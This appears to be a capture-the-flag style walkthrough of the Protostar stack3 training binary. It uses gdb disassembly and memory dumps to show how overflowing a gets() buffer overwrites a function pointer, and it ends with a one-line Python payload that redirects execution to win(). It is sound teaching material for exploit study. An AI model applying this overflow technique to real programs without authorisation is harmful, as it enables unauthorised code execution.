```as
(gdb) disas main
Dump of assembler code for function main:
0x08048438 <main+0>:	push   ebp
0x08048439 <main+1>:	mov    ebp,esp
0x0804843b <main+3>:	and    esp,0xfffffff0
0x0804843e <main+6>:	sub    esp,0x60
0x08048441 <main+9>:	mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <main+17>:	lea    eax,[esp+0x1c]
0x0804844d <main+21>:	mov    DWORD PTR [esp],eax
0x08048450 <main+24>:	call   0x8048330 <gets@plt>
0x08048455 <main+29>:	cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:	je     0x8048477 <main+63>
0x0804845c <main+36>:	mov    eax,0x8048560 ; "calling function pointer, jumping to 0x%08x\n"
0x08048461 <main+41>:	mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:	mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:	mov    DWORD PTR [esp],eax
0x0804846c <main+52>:	call   0x8048350 <printf@plt>
0x08048471 <main+57>:	mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:	call   eax
0x08048477 <main+63>:	leave  
0x08048478 <main+64>:	ret    
End of assembler dump.
```

### `esp+0x5c`
```as
0x08048441 <main+9>:	mov    DWORD PTR [esp+0x5c],0x0
...
0x08048455 <main+29>:	cmp    DWORD PTR [esp+0x5c],0x0
```

`esp+0x5c` is some variable that is set to `0x0`. Later we will use it in instruction `main+29` to compare it `0x0`, and if it's equal then jump to `main+63` which leads to `leave` instruction. So we need to modify the variable so that is not `0x0`, and will see what going on in between instruction `main+36` and `main+61`, especially the latter one because that seems promising, it calls to a function, and we can already predict based on the disassemble it self. It will call into whatever we put in our `esp+0x5c` variable.

Doing `$ objdump -d -M intel stack3`, and see the `.text` section above `main()` there will be this particular `win()` function.
```
08048424 <win>:
 8048424:	55                   	push   ebp
 8048425:	89 e5                	mov    ebp,esp
 8048427:	83 ec 18             	sub    esp,0x18
 804842a:	c7 04 24 40 85 04 08 	mov    DWORD PTR [esp],0x8048540
 8048431:	e8 2a ff ff ff       	call   8048360 <puts@plt>
 8048436:	c9                   	leave  
 8048437:	c3                   	ret    
```
and if we inspect that in gdb
```as
(gdb) x/wx 0x8048540
0x8048540:	0x65646f63
(gdb) x/s 0x8048540
0x8048540:	 "code flow successfully changed"
```
it's something that we must land on for completing this challenge. From the `main()` disassembly, there is no such instruction that will call `win()` function. So this indicates that we can leverage that variable `esp+0x5c` to call that `win()` function, we will modify its value into `win()` address which it nothing but `0x08048424`.

### call `gets()`
We are expected to do buffer over flow, and this is it.

```as
0x08048449 <main+17>:	lea    eax,[esp+0x1c]
0x0804844d <main+21>:	mov    DWORD PTR [esp],eax
0x08048450 <main+24>:	call   0x8048330 <gets@plt>
```
accessing stack at this offset `esp+0x1c` where this will be the starting of 64 bytes buffer, and we are expected to overflow it untill it touch the `esp+0x5c`. At that overflowed variable we place an address `0x08048424` of `win()` function which will helps to call the function. Before that we will see what happend when we give arbitrary value.

```as
(gdb) x/24wx $esp
0xbffff750:	0xbffff76c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff760:	0xb7fd7ff4	0xb7ec6165	0xbffff778	0x41414141
0xbffff770:	0x42424242	0x43434343	0x44444444	0x45454545
0xbffff780:	0x46464646	0x47474747	0x48484848	0x49494949
0xbffff790:	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c	0x4d4d4d4d
0xbffff7a0:	0x4e4e4e4e	0x4f4f4f4f	0x50505050	0x44434241


<!-- here is one way to determine how many buffer from where to where -->
(gdb) x/wx $esp+0x1c
0xbffff76c:	0x41414141
(gdb) x/wx $esp+0x5c
0xbffff7ac:	0x44434241

(gdb) p/x 0xbffff7ac - 0xbffff76c
$3 = 0x40
(gdb) p 0xbffff7ac - 0xbffff76c
$4 = 64

```

### call `eax`

Now in this instruction:
```
0x08048471 <main+57>:	mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:	call   eax
``` 
we will actually call something that is in `eax`, and in that register is `esp+0x5c` which in this case `0x44434241`. So continuing the instruction:

```
eip            0x8048475	0x8048475 <main+61>
(gdb) 
eax            0x44434241	1145258561
ecx            0x0	0
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff74c	0xbffff74c
ebp            0xbffff7b8	0xbffff7b8
esi            0x0	0
edi            0x0	0
eip            0x44434241	0x44434241
eflags         0x200296	[ PF AF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff74c:	0x08048477	0x08048560	0x44434241	0xb7fff8f8
0xbffff75c:	0xb7f0186e	0xb7fd7ff4	0xb7ec6165	0xbffff778
0xbffff76c:	0x41414141	0x42424242	0x43434343	0x44444444
0xbffff77c:	0x45454545	0x46464646	0x47474747	0x48484848
0xbffff78c:	0x49494949	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c
0xbffff79c:	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f	0x50505050
0x44434241:	Error while running hook_stop:
Cannot access memory at address 0x44434241
0x44434241 in ?? ()
(gdb) ni

Program received signal SIGSEGV, Segmentation fault.
eax            0x44434241	1145258561
ecx            0x0	0
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff74c	0xbffff74c
ebp            0xbffff7b8	0xbffff7b8
esi            0x0	0
edi            0x0	0
eip            0x44434241	0x44434241
eflags         0x210296	[ PF AF SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff74c:	0x08048477	0x08048560	0x44434241	0xb7fff8f8
0xbffff75c:	0xb7f0186e	0xb7fd7ff4	0xb7ec6165	0xbffff778
0xbffff76c:	0x41414141	0x42424242	0x43434343	0x44444444
0xbffff77c:	0x45454545	0x46464646	0x47474747	0x48484848
0xbffff78c:	0x49494949	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c
0xbffff79c:	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f	0x50505050
0x44434241:	Error while running hook_stop:
Cannot access memory at address 0x44434241
0x44434241 in ?? ()
```

it's segfault.

### Finally
```
$ python -c "print('A'*64+'\x24\x84\x04\x08')" > /tmp/payload

$ ./stack3 < /tmp/payload 
calling function pointer, jumping to 0x08048424
code flow successfully changed

```

```
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack3 < /tmp/payload

calling function pointer, jumping to 0x08048424
0x8048475 <main+61>:	call   eax
0x8048477 <main+63>:	leave  
0x8048478 <main+64>:	ret    

Breakpoint 5, 0x08048475 in main (argc=1, argv=0xbffff864) at stack3/stack3.c:22
22	in stack3/stack3.c

(gdb) si
0x8048424 <win>:	push   ebp
0x8048425 <win+1>:	mov    ebp,esp
0x8048427 <win+3>:	sub    esp,0x18
win () at stack3/stack3.c:7
7	in stack3/stack3.c

(gdb) c
Continuing.
0x8048431 <win+13>:	call   0x8048360 <puts@plt>
0x8048436 <win+18>:	leave  
0x8048437 <win+19>:	ret    

Breakpoint 6, 0x08048431 in win () at stack3/stack3.c:8
8	in stack3/stack3.c

(gdb) ni
code flow successfully changed
0x8048436 <win+18>:	leave  
0x8048437 <win+19>:	ret    
0x8048438 <main>:	push   ebp
9	in stack3/stack3.c

```